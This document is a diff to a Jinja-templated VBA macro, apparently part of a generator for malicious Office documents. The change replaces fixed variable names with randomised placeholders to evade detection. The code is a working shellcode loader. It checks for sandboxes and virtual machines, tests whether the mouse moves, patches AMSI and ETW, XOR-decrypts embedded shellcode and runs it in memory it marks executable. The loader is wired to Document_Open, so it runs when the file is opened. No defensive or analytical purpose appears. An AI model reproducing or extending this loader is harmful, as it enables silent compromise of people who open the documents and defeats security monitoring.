@@ -84,116 +84,116 @@ Private Function {{ v.fn_sandbox }}() As Boolean
     On Error Resume Next
     If Application.Documents.Count < 1 Then {{ v.fn_sandbox }} = True: Exit Function
     If Application.RecentFiles.Count < 3 Then {{ v.fn_sandbox }} = True: Exit Function
-    Dim usr As String: usr = LCase(Environ("USERNAME"))
-    Dim badU: badU = Split({{ v.vba_bad_users }}, Chr(124))
-    Dim i As Integer
-    For i = 0 To UBound(badU)
-        If usr = CStr(badU(i)) Then {{ v.fn_sandbox }} = True: Exit Function
+    Dim {{ v.vba_lv_usr }} As String: {{ v.vba_lv_usr }} = LCase(Environ("USERNAME"))
+    Dim {{ v.vba_lv_badu }}: {{ v.vba_lv_badu }} = Split({{ v.vba_bad_users }}, Chr(124))
+    Dim {{ v.vba_lv_lcnt }} As Integer
+    For {{ v.vba_lv_lcnt }} = 0 To UBound({{ v.vba_lv_badu }})
+        If {{ v.vba_lv_usr }} = CStr({{ v.vba_lv_badu }}({{ v.vba_lv_lcnt }})) Then {{ v.fn_sandbox }} = True: Exit Function
     Next
-    Dim cname As String: cname = LCase(Environ("COMPUTERNAME"))
-    Dim badC: badC = Split({{ v.vba_bad_computers }}, Chr(124))
-    For i = 0 To UBound(badC)
-        If InStr(cname, CStr(badC(i))) > 0 Then {{ v.fn_sandbox }} = True: Exit Function
+    Dim {{ v.vba_lv_cname }} As String: {{ v.vba_lv_cname }} = LCase(Environ("COMPUTERNAME"))
+    Dim {{ v.vba_lv_badc }}: {{ v.vba_lv_badc }} = Split({{ v.vba_bad_computers }}, Chr(124))
+    For {{ v.vba_lv_lcnt }} = 0 To UBound({{ v.vba_lv_badc }})
+        If InStr({{ v.vba_lv_cname }}, CStr({{ v.vba_lv_badc }}({{ v.vba_lv_lcnt }}))) > 0 Then {{ v.fn_sandbox }} = True: Exit Function
     Next
     On Error Resume Next
-    Dim _xi As Integer
-    Dim vmCodes({{ vba_vmware_reg_len }}) As Integer
-    {% for b in vba_vmware_reg_enc %}vmCodes({{ loop.index0 }})={{ b }}
-    {% endfor %}For _xi = 0 To {{ vba_vmware_reg_len }}: vmCodes(_xi) = vmCodes(_xi) Xor {{ vba_vmware_reg_xk }}: Next
-    Dim wshShell As Object
-    Set wshShell = CreateObject({{ v.vba_wscript_shell }})
-    wshShell.RegRead {{ v.fn_build_str }}(vmCodes)
-    If Err.Number = 0 Then {{ v.fn_sandbox }} = True: Set wshShell = Nothing: Exit Function
+    Dim {{ v.vba_lv_xi }} As Integer
+    Dim {{ v.vba_lv_vmcodes }}({{ vba_vmware_reg_len }}) As Integer
+    {% for b in vba_vmware_reg_enc %}{{ v.vba_lv_vmcodes }}({{ loop.index0 }})={{ b }}
+    {% endfor %}For {{ v.vba_lv_xi }} = 0 To {{ vba_vmware_reg_len }}: {{ v.vba_lv_vmcodes }}({{ v.vba_lv_xi }}) = {{ v.vba_lv_vmcodes }}({{ v.vba_lv_xi }}) Xor {{ vba_vmware_reg_xk }}: Next
+    Dim {{ v.vba_lv_shell }} As Object
+    Set {{ v.vba_lv_shell }} = CreateObject({{ v.vba_wscript_shell }})
+    {{ v.vba_lv_shell }}.RegRead {{ v.fn_build_str }}({{ v.vba_lv_vmcodes }})
+    If Err.Number = 0 Then {{ v.fn_sandbox }} = True: Set {{ v.vba_lv_shell }} = Nothing: Exit Function
     Err.Clear
-    Dim vbCodes({{ vba_vbox_reg_len }}) As Integer
-    {% for b in vba_vbox_reg_enc %}vbCodes({{ loop.index0 }})={{ b }}
-    {% endfor %}For _xi = 0 To {{ vba_vbox_reg_len }}: vbCodes(_xi) = vbCodes(_xi) Xor {{ vba_vbox_reg_xk }}: Next
-    wshShell.RegRead {{ v.fn_build_str }}(vbCodes)
-    If Err.Number = 0 Then {{ v.fn_sandbox }} = True: Set wshShell = Nothing: Exit Function
+    Dim {{ v.vba_lv_vbcodes }}({{ vba_vbox_reg_len }}) As Integer
+    {% for b in vba_vbox_reg_enc %}{{ v.vba_lv_vbcodes }}({{ loop.index0 }})={{ b }}
+    {% endfor %}For {{ v.vba_lv_xi }} = 0 To {{ vba_vbox_reg_len }}: {{ v.vba_lv_vbcodes }}({{ v.vba_lv_xi }}) = {{ v.vba_lv_vbcodes }}({{ v.vba_lv_xi }}) Xor {{ vba_vbox_reg_xk }}: Next
+    {{ v.vba_lv_shell }}.RegRead {{ v.fn_build_str }}({{ v.vba_lv_vbcodes }})
+    If Err.Number = 0 Then {{ v.fn_sandbox }} = True: Set {{ v.vba_lv_shell }} = Nothing: Exit Function
     Err.Clear
-    Set wshShell = Nothing
-    Dim fso2 As Object
-    Set fso2 = CreateObject({{ v.vba_fs_obj }})
+    Set {{ v.vba_lv_shell }} = Nothing
+    Dim {{ v.vba_lv_fso }} As Object
+    Set {{ v.vba_lv_fso }} = CreateObject({{ v.vba_fs_obj }})
     On Error Resume Next
-    Dim drv2 As Object
-    Set drv2 = fso2.GetDrive("C:")
+    Dim {{ v.vba_lv_drv }} As Object
+    Set {{ v.vba_lv_drv }} = {{ v.vba_lv_fso }}.GetDrive("C:")
     If Err.Number = 0 Then
-        If drv2.TotalSize < 53687091200 Then {{ v.fn_sandbox }} = True: Set fso2 = Nothing: Exit Function
+        If {{ v.vba_lv_drv }}.TotalSize < 53687091200 Then {{ v.fn_sandbox }} = True: Set {{ v.vba_lv_fso }} = Nothing: Exit Function
     End If
     On Error GoTo 0
-    Set fso2 = Nothing
-    Dim wmiSvc3 As Object
+    Set {{ v.vba_lv_fso }} = Nothing
+    Dim {{ v.vba_lv_wmisvc }} As Object
     On Error Resume Next
-    Set wmiSvc3 = GetObject({{ v.vba_winmgmts }})
+    Set {{ v.vba_lv_wmisvc }} = GetObject({{ v.vba_winmgmts }})
     If Err.Number = 0 Then
-        Dim prtQ As Object: Set prtQ = wmiSvc3.ExecQuery({{ v.vba_wmi_printer_q }})
-        Dim prtCnt As Long: prtCnt = 0
-        Dim oPrt As Object
-        For Each oPrt In prtQ: prtCnt = prtCnt + 1: Next
-        If prtCnt = 0 Then {{ v.fn_sandbox }} = True: Set wmiSvc3 = Nothing: Exit Function
+        Dim {{ v.vba_lv_prtq }} As Object: Set {{ v.vba_lv_prtq }} = {{ v.vba_lv_wmisvc }}.ExecQuery({{ v.vba_wmi_printer_q }})
+        Dim {{ v.vba_lv_prtcnt }} As Long: {{ v.vba_lv_prtcnt }} = 0
+        Dim {{ v.vba_lv_oprt }} As Object
+        For Each {{ v.vba_lv_oprt }} In {{ v.vba_lv_prtq }}: {{ v.vba_lv_prtcnt }} = {{ v.vba_lv_prtcnt }} + 1: Next
+        If {{ v.vba_lv_prtcnt }} = 0 Then {{ v.fn_sandbox }} = True: Set {{ v.vba_lv_wmisvc }} = Nothing: Exit Function
     End If
     On Error GoTo 0
-    Set wmiSvc3 = Nothing
-    Dim wmiProc As Object
+    Set {{ v.vba_lv_wmisvc }} = Nothing
+    Dim {{ v.vba_lv_wmiproc }} As Object
     On Error Resume Next
-    Set wmiProc = GetObject({{ v.vba_winmgmts }})
+    Set {{ v.vba_lv_wmiproc }} = GetObject({{ v.vba_winmgmts }})
     If Err.Number = 0 Then
-        Dim pQ As Object: Set pQ = wmiProc.ExecQuery({{ v.vba_wmi_proc_q }})
-        Dim badProc() As String: badProc = Split({{ v.vba_vm_procs }}, "|")
-        Dim oP As Object, pn As String, j As Integer
-        For Each oP In pQ
-            pn = LCase(oP.Name)
-            For j = 0 To UBound(badProc)
-                If pn = CStr(badProc(j)) Then {{ v.fn_sandbox }} = True: Set wmiProc = Nothing: Exit Function
-            Next j
-        Next oP
+        Dim {{ v.vba_lv_pq }} As Object: Set {{ v.vba_lv_pq }} = {{ v.vba_lv_wmiproc }}.ExecQuery({{ v.vba_wmi_proc_q }})
+        Dim {{ v.vba_lv_badproc }}() As String: {{ v.vba_lv_badproc }} = Split({{ v.vba_vm_procs }}, "|")
+        Dim {{ v.vba_lv_op }} As Object, {{ v.vba_lv_pn }} As String, {{ v.vba_lv_jcnt }} As Integer
+        For Each {{ v.vba_lv_op }} In {{ v.vba_lv_pq }}
+            {{ v.vba_lv_pn }} = LCase({{ v.vba_lv_op }}.Name)
+            For {{ v.vba_lv_jcnt }} = 0 To UBound({{ v.vba_lv_badproc }})
+                If {{ v.vba_lv_pn }} = CStr({{ v.vba_lv_badproc }}({{ v.vba_lv_jcnt }})) Then {{ v.fn_sandbox }} = True: Set {{ v.vba_lv_wmiproc }} = Nothing: Exit Function
+            Next {{ v.vba_lv_jcnt }}
+        Next {{ v.vba_lv_op }}
     End If
     On Error GoTo 0
-    Set wmiProc = Nothing
+    Set {{ v.vba_lv_wmiproc }} = Nothing
     If Environ({{ v.vba_env_vbox }}) <> "" Then {{ v.fn_sandbox }} = True: Exit Function
     If Environ({{ v.vba_env_sandboxie }}) <> "" Then {{ v.fn_sandbox }} = True: Exit Function
 End Function
 
 Private Sub {{ v.fn_exec }}()
     If {{ v.fn_sandbox }}() Then Exit Sub
-    Dim k32 As LongPtr: k32 = {{ v.fn_loadlib }}({{ v.vba_kernel32 }})
-    {{ v.fn_valloc }}  = {{ v.fn_getprocaddr }}(k32, {{ v.vba_virtual_alloc }})
-    {{ v.fn_movemem }} = {{ v.fn_getprocaddr }}(k32, {{ v.vba_rtl_move_mem }})
-    {{ v.fn_vprotect }} = {{ v.fn_getprocaddr }}(k32, {{ v.vba_virtual_protect }})
+    Dim {{ v.vba_lv_k32 }} As LongPtr: {{ v.vba_lv_k32 }} = {{ v.fn_loadlib }}({{ v.vba_kernel32 }})
+    {{ v.fn_valloc }}  = {{ v.fn_getprocaddr }}({{ v.vba_lv_k32 }}, {{ v.vba_virtual_alloc }})
+    {{ v.fn_movemem }} = {{ v.fn_getprocaddr }}({{ v.vba_lv_k32 }}, {{ v.vba_rtl_move_mem }})
+    {{ v.fn_vprotect }} = {{ v.fn_getprocaddr }}({{ v.vba_lv_k32 }}, {{ v.vba_virtual_protect }})
     If {{ v.fn_valloc }} = 0 Or {{ v.fn_movemem }} = 0 Or {{ v.fn_vprotect }} = 0 Then Exit Sub
-    Dim _u32 As LongPtr: _u32 = {{ v.fn_loadlib }}({{ v.vba_user32_dll }})
-    Dim _fnGcp As LongPtr: _fnGcp = {{ v.fn_getprocaddr }}(_u32, {{ v.vba_get_cursor_pos }})
-    If _fnGcp = 0 Then Exit Sub
-    Dim _pt1(1) As Long, _pt2(1) As Long
-    {{ v.fn_callwp }} _fnGcp, VarPtr(_pt1(0)), 0, 0, 0
-    Dim tStart As Date: tStart = Now
-    Do While DateDiff("s", tStart, Now) < 2: DoEvents: Loop
-    {{ v.fn_callwp }} _fnGcp, VarPtr(_pt2(0)), 0, 0, 0
-    If _pt1(0) = _pt2(0) And _pt1(1) = _pt2(1) Then Exit Sub
+    Dim {{ v.vba_lv_u32 }} As LongPtr: {{ v.vba_lv_u32 }} = {{ v.fn_loadlib }}({{ v.vba_user32_dll }})
+    Dim {{ v.vba_lv_gcpos }} As LongPtr: {{ v.vba_lv_gcpos }} = {{ v.fn_getprocaddr }}({{ v.vba_lv_u32 }}, {{ v.vba_get_cursor_pos }})
+    If {{ v.vba_lv_gcpos }} = 0 Then Exit Sub
+    Dim {{ v.vba_lv_pt1 }}(1) As Long, {{ v.vba_lv_pt2 }}(1) As Long
+    {{ v.fn_callwp }} {{ v.vba_lv_gcpos }}, VarPtr({{ v.vba_lv_pt1 }}(0)), 0, 0, 0
+    Dim {{ v.vba_lv_tstart }} As Date: {{ v.vba_lv_tstart }} = Now
+    Do While DateDiff("s", {{ v.vba_lv_tstart }}, Now) < 2: DoEvents: Loop
+    {{ v.fn_callwp }} {{ v.vba_lv_gcpos }}, VarPtr({{ v.vba_lv_pt2 }}(0)), 0, 0, 0
+    If {{ v.vba_lv_pt1 }}(0) = {{ v.vba_lv_pt2 }}(0) And {{ v.vba_lv_pt1 }}(1) = {{ v.vba_lv_pt2 }}(1) Then Exit Sub
     Call {{ v.fn_amsi_patch }}
     Call {{ v.fn_etw_patch }}
 
-    Dim sc_hex As String, key_hex As String
-    sc_hex  = {% for chunk in shellcode_chunks %}"{{ chunk }}"{% if not loop.last %} & {% endif %}{% endfor %}
-    key_hex = {% for chunk in key_chunks %}"{{ chunk }}"{% if not loop.last %} & {% endif %}{% endfor %}
+    Dim {{ v.vba_lv_schex }} As String, {{ v.vba_lv_keyhex }} As String
+    {{ v.vba_lv_schex }}  = {% for chunk in shellcode_chunks %}"{{ chunk }}"{% if not loop.last %} & {% endif %}{% endfor %}
+    {{ v.vba_lv_keyhex }} = {% for chunk in key_chunks %}"{{ chunk }}"{% if not loop.last %} & {% endif %}{% endfor %}
 
-    Dim _k() As Byte
-    _k = {{ v.fn_hex2arr }}(key_hex)
-    Dim _ki As Long
-    For _ki = 0 To UBound(_k): _k(_ki) = _k(_ki) Xor {{ key_tweak }}: Next
+    Dim {{ v.vba_lv_k }}() As Byte
+    {{ v.vba_lv_k }} = {{ v.fn_hex2arr }}({{ v.vba_lv_keyhex }})
+    Dim {{ v.vba_lv_ki }} As Long
+    For {{ v.vba_lv_ki }} = 0 To UBound({{ v.vba_lv_k }}): {{ v.vba_lv_k }}({{ v.vba_lv_ki }}) = {{ v.vba_lv_k }}({{ v.vba_lv_ki }}) Xor {{ key_tweak }}: Next
 
-    Dim raw() As Byte, sc() As Byte
-    raw = {{ v.fn_hex2arr }}(sc_hex)
-    sc  = {{ v.fn_xor }}(raw, _k)
+    Dim {{ v.vba_lv_raw }}() As Byte, {{ v.vba_lv_sc }}() As Byte
+    {{ v.vba_lv_raw }} = {{ v.fn_hex2arr }}({{ v.vba_lv_schex }})
+    {{ v.vba_lv_sc }}  = {{ v.fn_xor }}({{ v.vba_lv_raw }}, {{ v.vba_lv_k }})
 
-    Dim mem As LongPtr
-    mem = {{ v.fn_callwp }}({{ v.fn_valloc }}, 0, UBound(sc) + 1, &H3000, &H04)
-    If mem = 0 Then Exit Sub
-    {{ v.fn_callwp }} {{ v.fn_movemem }}, mem, VarPtr(sc(0)), UBound(sc) + 1, 0
-    Dim oldP As Long
-    {{ v.fn_callwp }} {{ v.fn_vprotect }}, mem, UBound(sc) + 1, &H20, VarPtr(oldP)
+    Dim {{ v.vba_lv_mem }} As LongPtr
+    {{ v.vba_lv_mem }} = {{ v.fn_callwp }}({{ v.fn_valloc }}, 0, UBound({{ v.vba_lv_sc }}) + 1, &H3000, &H04)
+    If {{ v.vba_lv_mem }} = 0 Then Exit Sub
+    {{ v.fn_callwp }} {{ v.fn_movemem }}, {{ v.vba_lv_mem }}, VarPtr({{ v.vba_lv_sc }}(0)), UBound({{ v.vba_lv_sc }}) + 1, 0
+    Dim {{ v.vba_lv_oldp }} As Long
+    {{ v.fn_callwp }} {{ v.fn_vprotect }}, {{ v.vba_lv_mem }}, UBound({{ v.vba_lv_sc }}) + 1, &H20, VarPtr({{ v.vba_lv_oldp }})
 
-    {{ v.fn_callwp }} mem, 0, 0, 0, 0
+    {{ v.fn_callwp }} {{ v.vba_lv_mem }}, 0, 0, 0, 0
 End Sub
 
 Public Sub Document_Open()
